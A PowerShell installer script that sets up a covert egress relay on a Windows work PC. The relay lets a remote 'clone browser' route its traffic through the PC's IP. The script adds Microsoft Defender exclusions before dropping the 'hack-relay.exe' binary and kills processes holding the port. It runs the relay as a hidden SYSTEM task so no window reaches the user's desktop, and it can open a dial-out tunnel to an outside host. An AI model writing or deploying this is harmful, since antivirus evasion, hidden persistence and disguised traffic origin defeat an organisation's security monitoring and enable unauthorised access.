# install-relay.ps1 - work-PC (Windows) installer for the egress relay
# (directive section 13: the proxy the hosted clone browser dials so all
# traffic egresses from the work PC's IP).
#
# DEPLOYMENT RULE (same as the receiver): the install folder is QUARANTINED
# BEFORE the binary lands in it - Defender path+process exclusions are added
# and VERIFIED while the folder is still empty (preflight --exe selects the
# relay's process-exclusion name). Verified against the hack-relay.exe
# quarantine incident (relay killed mid-rollout without one).
#
# SILENCE: the scheduled task runs under SYSTEM in session 0, so neither the
# relay nor anything it spawns can put a window on the user's desktop.
#
# TASK_118 B8-2: -TunnelHost/-TunnelKey enable cmd/relay's dial-out mode
# (built in B8-3, never wired into this - the only production install path -
# until now). Both are optional and only meaningful together; the classic
# -Addr listener stays registered either way (it's still the relay's own
# port-preflight bind, per cmd/relay/main.go, and the lab/topology fallback).
#
# usage: install-relay.ps1 <new-relay-exe> [install-dir] [addr] [token] [tunnel-host] [tunnel-key]
param(
    [Parameter(Mandatory = $true)][string]$NewExe,
    [string]$InstallDir = "C:\ProgramData\TacticalRMM\Relay",
    [string]$Addr = "0.0.0.0:8080",
    [string]$Token = "",
    [string]$TunnelHost = "",
    [string]$TunnelKey = ""
)
$ErrorActionPreference = 'Stop'

# 1. RULE: quarantine first (folder must stay empty until verified).
# The `preflight` subcommand lives in the ENGINE CLI (hack-browser-clone.exe),
# NOT in the relay binary: cmd/relay parses no subcommands, so calling
# `hack-relay.exe preflight ...` aborted with exit 2 and EVERY relay install
# failed before copying anything (found 2026-09-24 while wiring the one-click
# device setup - it is why egress mode relay could never come up). Resolve the
# engine from the staged bundle next to $NewExe first, then from the installed
# CloneTool copy. -Exe names the relay so the process exclusion is explicit;
# the whole component family is excluded anyway (componentExeNames).
$pfExe = Join-Path (Split-Path -Parent $NewExe) 'hack-browser-clone.exe'
if (-not (Test-Path $pfExe)) { $pfExe = 'C:\ProgramData\TacticalRMM\CloneTool\hack-browser-clone.exe' }
if (-not (Test-Path $pfExe)) {
    throw "engine CLI (hack-browser-clone.exe) not found for preflight - stage the engine bundle next to $NewExe"
}
$pf = & $pfExe preflight --dir $InstallDir --exe hack-relay.exe
$pf | Write-Host
if ($LASTEXITCODE -ne 0) {
    throw "preflight (install-folder quarantine) failed - refusing to install"
}

# 1b. port preflight: a stale listener squatting the endpoint silently
# breaks every later deploy (observed with the receiver on :8080).
$port = ($Addr -split ':')[-1]
$held = Get-NetTCPConnection -LocalPort $port -State Listen -ErrorAction SilentlyContinue
if ($held) {
    Write-Warning "port $port is already held by PID(s) $($held.OwningProcess -join ',') - stopping them"
    $held | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue }
    Start-Sleep -Seconds 2
}

# 2. install into the quarantined folder.
New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
Copy-Item $NewExe (Join-Path $InstallDir 'hack-relay.exe') -Force
$exe = Join-Path $InstallDir 'hack-relay.exe'

# 3. durable registration (SYSTEM, at boot, session 0 = no window): the
# ssh-spawned relay dies with the ssh session (job-object teardown),
# observed twice. Build it with -H=windowsgui (see build.ps1) so even a
# manual run cannot raise a console.
$args_ = "-addr $Addr"
if ($Token) { $args_ += " -token $Token" }
if ($TunnelHost -and $TunnelKey) {
    # -token above is REQUIRED for tunnel mode too (cmd/relay/main.go: the
    # tunnel control handshake is gated by the SAME flag as the -addr
    # listener's Proxy-Authorization) - the caller must pass the shared
    # ingress secret as -Token whenever it also passes -TunnelHost/-TunnelKey.
    $args_ += " -tunnel $TunnelHost -tunnel-key $TunnelKey"
}
schtasks /Create /TN SpaceworkerRelay /TR "`"$exe`" $args_" /SC ONSTART /RU SYSTEM /F | Out-Null
# TASK_213: tasks created via `schtasks /Create` carry the Task Scheduler
# library defaults — DisallowStartIfOnBatteries + StopIfGoingOnBatteries +
# StopOnIdleEnd — which silently stop the relay on laptops (observed live:
# probe reads DOWN seconds after a healthy install, and again after sleep/wake,
# while the task itself shows Running/LastResult 267009/0x41301). The relay
# must only die when the OS itself kills it, never on power/idle policy.
$t = Get-ScheduledTask -TaskName 'SpaceworkerRelay'
$t.Settings.DisallowStartIfOnBatteries = $false
$t.Settings.StopIfGoingOnBatteries = $false
$t.Settings.StopOnIdleEnd = $false
Set-ScheduledTask -InputObject $t | Out-Null
schtasks /Run /TN SpaceworkerRelay | Out-Null
# Wait for the relay to actually BIND the port before declaring success. The
# relay is a windowsgui binary spawned by the ONSTART task, so there is a real
# window between `schtasks /Run` and the listener coming up. The OLD fixed 2s
# sleep let install return exit=0 before the port was open, and the very next
# relay-probe then read "down" and aborted setup (TASK_206, seen live). Poll the
# port until it accepts or a bounded deadline elapses; on timeout, THROW so the
# exit code is truthful (a relay that never bound is NOT a success) —
# $ErrorActionPreference='Stop' (line 29) makes the throw a non-zero exit.
$bound = $false
$deadline = (Get-Date).AddSeconds(30)
while ((Get-Date) -lt $deadline) {
    $c = New-Object Net.Sockets.TcpClient
    try { $c.Connect('127.0.0.1', [int]$port); $bound = $true } catch { $bound = $false } finally { $c.Close() }
    if ($bound) { break }
    Start-Sleep -Milliseconds 1500
}
if (-not $bound) {
    throw "relay did not bind port $port within 30s (task SpaceworkerRelay) - install failed"
}
netstat -ano | Select-String ":$port.*LISTENING" | Write-Host
if ($TunnelHost -and $TunnelKey) {
    Write-Host "relay installed: $exe on $Addr, dial-out tunnel -> $TunnelHost (task SpaceworkerRelay)"
} else {
    Write-Host "relay installed: $exe on $Addr (task SpaceworkerRelay)"
}